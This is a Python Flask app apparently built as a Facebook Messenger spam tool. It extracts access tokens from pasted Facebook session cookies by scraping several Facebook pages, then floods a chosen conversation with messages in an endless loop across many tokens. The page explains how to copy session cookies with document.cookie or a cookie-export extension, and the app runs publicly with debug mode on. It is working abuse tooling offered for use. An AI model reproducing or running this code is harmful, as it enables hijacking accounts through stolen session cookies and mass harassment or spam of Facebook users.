from flask import Flask, request, render_template_string
import requests
from threading import Thread, Event
import time
import random
import string
import re
import json
import urllib.parse

app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
    'referer': 'www.google.com'
}

stop_events = {}
threads = {}

def parse_cookie_input(cookie_input):
    """Parse cookie input in either JSON or string format"""
    try:
        cookie_json = json.loads(cookie_input)
        cookies = {}
        cookie_string = ""
        for cookie in cookie_json:
            if 'name' in cookie and 'value' in cookie:
                cookies[cookie['name']] = cookie['value']
                cookie_string += f"{cookie['name']}={cookie['value']}; "
        return cookies, cookie_string.strip()
    except json.JSONDecodeError:
        cookies = {}
        cookie_string = cookie_input
        for item in cookie_input.split(';'):
            if '=' in item:
                name, value = item.strip().split('=', 1)
                cookies[name.strip()] = value.strip()
        return cookies, cookie_input

def extract_token_from_cookie(cookie_input):
    """Extract Facebook access token using multiple methods"""
    try:
        cookies, cookie_string = parse_cookie_input(cookie_input)
        session = requests.Session()
        
        # Set all cookies
        for name, value in cookies.items():
            session.cookies.set(name, value, domain='.facebook.com')
        
        if 'c_user' not in cookies:
            return None, "Missing c_user cookie. Make sure you're logged into Facebook."
        
        c_user = cookies.get('c_user')
        xs = cookies.get('xs', '')
        
        headers_fb = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Cookie': cookie_string,
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }
        
        tokens_found = []
        
        # Method 1: Get token from Facebook Gaming
        try:
            response = session.get('https://www.facebook.com/gaming/feed/', 
                                 headers=headers_fb, timeout=15)
            
            patterns = [
                r'"accessToken":"(EAA[A-Za-z0-9]+)"',
                r'accessToken:"(EAA[A-Za-z0-9]+)"',
                r'\"accessToken\":\"(EAA[A-Za-z0-9]+)\"',
                r'access_token=([E][A][A][A-Za-z0-9]+)',
                r'"access_token":"(EAA[A-Za-z0-9]+)"',
            ]
            
            for pattern in patterns:
                matches = re.findall(pattern, response.text)
                for match in matches:
                    if len(match) > 50 and match not in tokens_found:
                        tokens_found.append(match)
        except Exception as e:
            print(f"Method 1 failed: {e}")
        
        # Method 2: Try to get token from video upload page
        try:
            response = session.get('https://www.facebook.com/live/create', 
                                 headers=headers_fb, timeout=15)
            
            patterns = [
                r'accessToken\\":\\"([E][A][A][A-Za-z0-9]+)\\"',
                r'\"accessToken\":\"([E][A][A][A-Za-z0-9]+)\"',
                r'clientAccessToken\\":\\"([A-Za-z0-9]+)\\"',
            ]
            
            for pattern in patterns:
                matches = re.findall(pattern, response.text)
                for match in matches:
                    if len(match) > 50 and match.startswith('EAA') and match not in tokens_found:
                        tokens_found.append(match)
        except Exception as e:
            print(f"Method 2 failed: {e}")
        
        # Method 3: Get token from business suite
        try:
            response = session.get('https://business.facebook.com/latest/home', 
                                 headers=headers_fb, timeout=15)
            
            patterns = [
                r'accessToken\\":\\"([E][A][A][A-Za-z0-9]+)\\"',
                r'\"accessToken\":\"([E][A][A][A-Za-z0-9]+)\"',
            ]
            
            for pattern in patterns:
                matches = re.findall(pattern, response.text)
                for match in matches:
                    if len(match) > 50 and match not in tokens_found:
                        tokens_found.append(match)
        except Exception as e:
            print(f"Method 3 failed: {e}")
        
        # Method 4: Get EAAU token from mobile site
        try:
            headers_mobile = headers_fb.copy()
            headers_mobile['User-Agent'] = 'Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
            
            response = session.get('https://m.facebook.com/', 
                                 headers=headers_mobile, timeout=15)
            
            # Look for any EAA token
            ea_pattern = r'EAA[A-Za-z0-9]{100,}'
            matches = re.findall(ea_pattern, response.text)
            for match in matches:
                if match not in tokens_found:
                    tokens_found.append(match)
        except Exception as e:
            print(f"Method 4 failed: {e}")
        
        # Method 5: Try to generate token using graph API
        try:
            # First get a client token
            response = session.get('https://www.facebook.com/', headers=headers_fb, timeout=15)
            
            # Look for client token
            client_patterns = [
                r'clientToken\\":\\"([A-Za-z0-9_-]+)\\"',
                r'\"clientToken\":\"([A-Za-z0-9_-]+)\"',
            ]
            
            client_token = None
            for pattern in client_patterns:
                match = re.search(pattern, response.text)
                if match:
                    client_token = match.group(1)
                    break
            
            if client_token:
                tokens_found.append(f"Client Token: {client_token}")
        except Exception as e:
            print(f"Method 5 failed: {e}")
        
        if tokens_found:
            # Return the longest token (usually the access token)
            tokens_found.sort(key=len, reverse=True)
            return tokens_found[0], None
        else:
            # Return cookie string as fallback (can be used with some APIs)
            cookie_preview = cookie_string[:200] + "..." if len(cookie_string) > 200 else cookie_string
            return f"COOKIE_STRING:{cookie_string}", None
            
    except Exception as e:
        return None, f"Error: {str(e)}"

def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                # Handle both regular tokens and cookie strings
                if access_token.startswith("COOKIE_STRING:"):
                    # Use cookie-based authentication
                    cookie_str = access_token.replace("COOKIE_STRING:", "")
                    session = requests.Session()
                    for cookie in cookie_str.split(';'):
                        if '=' in cookie:
                            name, value = cookie.strip().split('=', 1)
                            session.cookies.set(name.strip(), value.strip())
                    
                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    message = str(mn) + ' ' + message1
                    data = {'message': message}
                    
                    try:
                        response = session.post(api_url, data=data, headers=headers, timeout=10)
                        if response.status_code == 200:
                            print(f"Message Sent Successfully (Cookie Auth): {message}")
                        else:
                            print(f"Message Failed (Cookie Auth): {response.status_code}")
                    except Exception as e:
                        print(f"Error: {e}")
                else:
                    # Use token-based authentication
                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    message = str(mn) + ' ' + message1
                    parameters = {'access_token': access_token, 'message': message}
                    try:
                        response = requests.post(api_url, data=parameters, headers=headers, timeout=10)
                        if response.status_code == 200:
                            print(f"Message Sent Successfully From token {access_token[:20]}...: {message}")
                        else:
                            print(f"Message Failed: {response.status_code} - {response.text[:100]}")
                    except Exception as e:
                        print(f"Error sending message: {e}")
                time.sleep(time_interval)

@app.route('/', methods=['GET', 'POST'])
def send_message():
    extraction_success = False
    extraction_error = None
    extracted_token = None
    task_started = False
    task_id = None
    stop_success = False
    stopped_task_id = None
    
    if request.method == 'POST':
        action = request.form.get('action')
        
        if action == 'extract_token':
            cookie_string = request.form.get('cookieString')
            if cookie_string:
                token, error = extract_token_from_cookie(cookie_string)
                if token:
                    extraction_success = True
                    extracted_token = token
                else:
                    extraction_error = error
        
        elif action == 'send_messages':
            token_option = request.form.get('tokenOption')
            
            if token_option == 'single':
                single_token = request.form.get('singleToken')
                if single_token:
                    access_tokens = [single_token]
                else:
                    access_tokens = []
            else:
                if 'tokenFile' in request.files:
                    token_file = request.files['tokenFile']
                    if token_file.filename:
                        access_tokens = token_file.read().decode().strip().splitlines()
                    else:
                        access_tokens = []
                else:
                    access_tokens = []
            
            thread_id = request.form.get('threadId')
            mn = request.form.get('kidx')
            time_interval = int(request.form.get('time', 1))
            
            if 'txtFile' in request.files:
                txt_file = request.files['txtFile']
                if txt_file.filename:
                    messages = txt_file.read().decode().splitlines()
                else:
                    messages = []
            else:
                messages = []
            
            if access_tokens and thread_id and messages:
                task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
                stop_events[task_id] = Event()
                thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
                threads[task_id] = thread
                thread.start()
                task_started = True
    
    return render_template_string(HTML_TEMPLATE,
                                extraction_success=extraction_success,
                                extraction_error=extraction_error,
                                extracted_token=extracted_token,
                                task_started=task_started,
                                task_id=task_id,
                                stop_success=stop_success,
                                stopped_task_id=stopped_task_id)

@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    stop_success = False
    stopped_task_id = None
    
    if task_id in stop_events:
        stop_events[task_id].set()
        stop_success = True
        stopped_task_id = task_id
    
    return render_template_string(HTML_TEMPLATE,
                                extraction_success=False,
                                extraction_error=None,
                                extracted_token=None,
                                task_started=False,
                                task_id=None,
                                stop_success=stop_success,
                                stopped_task_id=stopped_task_id)

# HTML Template with better instructions
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>👀AHMAD ALI SAFDAR🌀</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <style>
    label { color: white; }
    body {
      background-image: url('https://i.ibb.co/LRrPTkG/c278d531d734cc6fcf79165d664fdee3.jpg');
      background-size: cover;
      background-repeat: no-repeat;
      background-attachment: fixed;
      color: white;
    }
    .container {
      max-width: 550px;
      border-radius: 20px;
      padding: 20px;
      box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
      box-shadow: 0 0 15px white;
      border: none;
      background: rgba(0, 0, 0, 0.7);
      margin-bottom: 20px;
    }
    .form-control, .form-select {
      outline: 1px red;
      border: 1px double white;
      background: rgba(255, 255, 255, 0.1);
      width: 100%;
      padding: 7px;
      margin-bottom: 15px;
      border-radius: 10px;
      color: white;
    }
    .form-control:focus {
      background: rgba(255, 255, 255, 0.2);
      color: white;
    }
    select option {
      background: #333;
      color: white;
    }
    .header { text-align: center; padding-bottom: 20px; }
    .btn-submit { width: 100%; margin-top: 10px; }
    .footer { text-align: center; margin-top: 20px; color: #888; }
    .whatsapp-link {
      display: inline-block;
      color: #25d366;
      text-decoration: none;
      margin-top: 10px;
    }
    .whatsapp-link i { margin-right: 5px; }
    .nav-tabs { border-bottom: 2px solid #007bff; }
    .nav-tabs .nav-link {
      color: white;
      border: none;
      font-weight: bold;
    }
    .nav-tabs .nav-link.active {
      background: #007bff;
      color: white;
      border-radius: 10px 10px 0 0;
    }
    .alert {
      border-radius: 10px;
      margin-top: 10px;
    }
    textarea.form-control {
      min-height: 120px;
      font-family: monospace;
      font-size: 12px;
    }
    .token-box {
      background: rgba(0, 0, 0, 0.3);
      padding: 10px;
      border-radius: 5px;
      word-break: break-all;
      font-family: monospace;
      font-size: 12px;
      margin-top: 10px;
      max-height: 200px;
      overflow-y: auto;
    }
    .warning-box {
      background: rgba(255, 193, 7, 0.2);
      border-left: 4px solid #ffc107;
      padding: 10px;
      border-radius: 5px;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <header class="header mt-4">
    <h1 class="mt-3">♛♥彡𝐀𝐇𝐌𝐀𝐃 𝐀𝐋𝚰♛♥☨</h1>
  </header>
  
  <div class="container">
    <ul class="nav nav-tabs mb-3" id="myTab" role="tablist">
      <li class="nav-item" role="presentation">
        <button class="nav-link active" id="message-tab" data-bs-toggle="tab" data-bs-target="#message" type="button" role="tab">Message Sender</button>
      </li>
      <li class="nav-item" role="presentation">
        <button class="nav-link" id="token-tab" data-bs-toggle="tab" data-bs-target="#token" type="button" role="tab">Token Extractor</button>
      </li>
    </ul>
    
    <div class="tab-content">
      <!-- Message Sender Tab -->
      <div class="tab-pane fade show active" id="message" role="tabpanel">
        <form method="post" enctype="multipart/form-data">
          <input type="hidden" name="action" value="send_messages">
          
          <div class="mb-3">
            <label for="tokenOption" class="form-label">Select Token Option</label>
            <select class="form-select" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
              <option value="single">Single Token / Cookie String</option>
              <option value="multiple">Token File</option>
            </select>
          </div>
          
          <div class="mb-3" id="singleTokenInput">
            <label for="singleToken" class="form-label">Enter Token or Cookie String</label>
            <input type="text" class="form-control" id="singleToken" name="singleToken" placeholder="EAA... or COOKIE_STRING:...">
          </div>
          
          <div class="mb-3" id="tokenFileInput" style="display: none;">
            <label for="tokenFile" class="form-label">Choose Token File</label>
            <input type="file" class="form-control" id="tokenFile" name="tokenFile" accept=".txt">
          </div>
          
          <div class="mb-3">
            <label for="threadId" class="form-label">Enter Inbox/convo uid</label>
            <input type="text" class="form-control" id="threadId" name="threadId" required>
            <small class="text-muted">Example: 100088765432109</small>
          </div>
          
          <div class="mb-3">
            <label for="kidx" class="form-label">Enter Prefix Name</label>
            <input type="text" class="form-control" id="kidx" name="kidx" required>
          </div>
          
          <div class="mb-3">
            <label for="time" class="form-label">Enter Time (seconds)</label>
            <input type="number" class="form-control" id="time" name="time" value="1" required>
          </div>
          
          <div class="mb-3">
            <label for="txtFile" class="form-label">Choose Messages File</label>
            <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
          </div>
          
          <button type="submit" class="btn btn-primary btn-submit">Run Message Sender</button>
        </form>
        
        {% if task_started %}
        <div class="alert alert-success mt-3">
          <strong>Success!</strong> Task started with ID: <code>{{ task_id }}</code>
        </div>
        {% endif %}
        
        <form method="post" action="/stop" class="mt-3">
          <div class="mb-3">
            <label for="taskId" class="form-label">Enter Task ID to Stop</label>
            <input type="text" class="form-control" id="taskId" name="taskId" required>
          </div>
          <button type="submit" class="btn btn-danger btn-submit">Stop Task</button>
        </form>
        
        {% if stop_success %}
        <div class="alert alert-warning mt-3">
          Task with ID <code>{{ stopped_task_id }}</code> has been stopped.
        </div>
        {% endif %}
      </div>
      
      <!-- Token Extractor Tab -->
      <div class="tab-pane fade" id="token" role="tabpanel">
        <form method="post">
          <input type="hidden" name="action" value="extract_token">
          
          <div class="mb-3">
            <label for="cookieString" class="form-label">Paste Facebook Cookie</label>
            <textarea class="form-control" id="cookieString" name="cookieString" rows="10" placeholder='Paste your Facebook cookie here...'></textarea>
          </div>
          
          <button type="submit" class="btn btn-success btn-submit">
            <i class="fas fa-key"></i> Extract Token / Get Cookie String
          </button>
        </form>
        
        {% if extraction_success %}
        <div class="alert alert-success mt-3">
          <strong>Extracted Successfully!</strong><br>
          <div class="token-box">
            <code id="extractedToken">{{ extracted_token }}</code>
          </div>
          <button class="btn btn-sm btn-info mt-2" onclick="copyToken()">
            <i class="fas fa-copy"></i> Copy to Clipboard
          </button>
          
          <div class="warning-box mt-3">
            <strong>📌 Note:</strong> If it starts with "COOKIE_STRING:", you can use this directly in the Message Sender tab. This works as an alternative when Facebook doesn't provide a regular access token.
          </div>
        </div>
        {% endif %}
        
        {% if extraction_error %}
        <div class="alert alert-danger mt-3">
          <strong>Error!</strong> {{ extraction_error }}
        </div>
        {% endif %}
        
        <div class="alert alert-info mt-3">
          <strong>📌 How to get Facebook Cookie:</strong><br>
          <strong>Method 1 (Recommended):</strong><br>
          1. Install "EditThisCookie" Chrome extension<br>
          2. Login to Facebook<br>
          3. Click EditThisCookie icon → Export (📤)<br>
          4. Paste the JSON here<br><br>
          
          <strong>Method 2 (Console):</strong><br>
          1. Login to Facebook<br>
          2. Press F12 → Console tab<br>
          3. Type: <code>document.cookie</code><br>
          4. Copy and paste the result here<br><br>
          
          <strong>Method 3 (Manual):</strong><br>
          Format: <code>c_user=YOUR_ID; xs=YOUR_XS; fr=YOUR_FR</code>
        </div>
      </div>
    </div>
  </div>
  
  <footer class="footer">
    <p>© 2024 ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ🥀✌️ᴀʜᴍᴀᴅ.ᴋɪɴɢ😈🐧</p>
    <p> 𝐀𝐇𝐌𝐀𝐃 𝐊𝚰𝐍𝐆 𝐇𝐄𝐑𝐄<a href="https://www.facebook.com/ahmadali.safdar.52?mibextid=ZbWKwL">ᴄʟɪᴄᴋ ʜᴇʀᴇ ғᴏʀ ғᴀᴄᴇʙᴏᴏᴋ</a></p>
    <div class="mb-3">
      <a href="https://wa.me/+923324661564" class="whatsapp-link">
        <i class="fab fa-whatsapp"></i> Chat on WhatsApp
      </a>
    </div>
  </footer>
  
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
  <script>
    function toggleTokenInput() {
      var tokenOption = document.getElementById('tokenOption').value;
      if (tokenOption == 'single') {
        document.getElementById('singleTokenInput').style.display = 'block';
        document.getElementById('tokenFileInput').style.display = 'none';
      } else {
        document.getElementById('singleTokenInput').style.display = 'none';
        document.getElementById('tokenFileInput').style.display = 'block';
      }
    }
    
    function copyToken() {
      var tokenText = document.getElementById('extractedToken').innerText;
      navigator.clipboard.writeText(tokenText).then(function() {
        alert('Copied to clipboard!');
      });
    }
  </script>
</body>
</html>
'''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
